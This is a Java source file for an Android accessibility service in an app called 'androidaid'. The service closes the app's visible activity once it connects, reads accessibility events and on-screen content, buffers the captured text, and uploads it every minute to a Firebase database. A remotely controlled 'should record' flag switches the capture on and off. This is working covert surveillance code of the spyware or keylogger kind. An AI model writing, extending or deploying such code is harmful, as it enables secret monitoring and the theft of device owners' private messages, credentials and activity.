package androidaid.android.com.androidaid;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.v4.content.WakefulBroadcastReceiver;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import androidaid.android.com.androidaid.core.ActivityManager;
import androidaid.android.com.androidaid.networking.DatabaseNetworking;
import androidaid.android.com.androidaid.networking.InternetSpeed;
import androidaid.android.com.androidaid.program_flow.Constants;
import androidaid.android.com.androidaid.program_flow.Flags;
import androidaid.android.com.androidaid.storage.InternalStorageManager;
import androidaid.android.com.androidaid.storage.InternalStorageParser;

public class MainAccessService extends AccessibilityService {
    private static BroadcastReceiver timeChangedReceiver;
    private static boolean isActive = false; //whether the service should be active or not (queried from the database)

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        //System.out.println("[sproc32.MainAccessService]: Found an accessibility event.");
        //System.out.println("[sproc32.MAS]: eventType = " + event.getEventType());
        //System.out.println("[sproc32.MAS]: eventClass =" + event.getClassName().toString());

        //check connection with firebase here
        try {
            if(InternetSpeed.isOnline() && isActive) {
                AccessibilityEventManager.handleOnlineAccessibilityEvent(event, getRootInActiveWindow());
            } else {
                AccessibilityEventManager.handleOfflineAccessibilityEvent(event, getRootInActiveWindow());
            }
        } catch (Exception e) {
            System.out.println("[sproc32.MAS.onAccessibilityEvent]: An unknown exception occurred!");
        }
    }

    @Override
    public void onInterrupt() {

    }

    @Override
    public void onServiceConnected() {
        System.out.println("[sproc32.MainAccessService]: Service is connected.");
        Flags.serviceStarted = true;

        registerTimeChangeReceiver();
        registerActiveReceiver();

        ActivityManager.getMainActivity().finish();

    }

    @Override
    public void onDestroy() {
        try {
            unregisterReceiver(timeChangedReceiver);
        } catch (Exception e) {
            //System.out.println("[sproc32.MAS.onDestroy]: Caught an exception while trying to unregister receivers");
            e.printStackTrace();
        }
    }

    /**
     * Registers the on time tick receiver (called every minute) to check for internal storage text and if it's needed to be sent
     * to the database.
     */
    private void registerTimeChangeReceiver() {
        timeChangedReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                //each minute, check if InternalStorageState has any lines to be read. If yes, parse them with InternalStorageParser and send them to the database.
                //System.out.println("[sproc32.MAS]: Received a time tick event!");

                //if internal storage isn't empty, send data from internal storage to the database
                if (InternalStorageManager.checkInternalStorageStateEmpty() == false && InternetSpeed.isOnline()) {
                    //System.out.println("[sproc32.MAS]: Internal storage isn't empty. Starting to check, read and send data from internal storage to the database!");
                    DatabaseNetworking.storeInternalStorageText(InternalStorageParser.parseInternalStorage());
                }
            }
        };

        //System.out.println("[sproc32.MAS]: Registering time change receiver!");
        IntentFilter timeTickIF = new IntentFilter(Intent.ACTION_TIME_TICK);
        registerReceiver(timeChangedReceiver, timeTickIF);

    }

    private void registerActiveReceiver() {
        FirebaseDatabase.getInstance().getReference(Constants.DATABASE_NODE_INSTRUCTIONS).child(Constants.DATABASE_NODE_INSTRUCTIONS_SUBNODE_SHOULD_RECORD).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                isActive = (boolean) dataSnapshot.getValue();
                System.out.println("[sproc32.MAS.registerActiveReceiver]: isActive = " + isActive);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });
    }
}
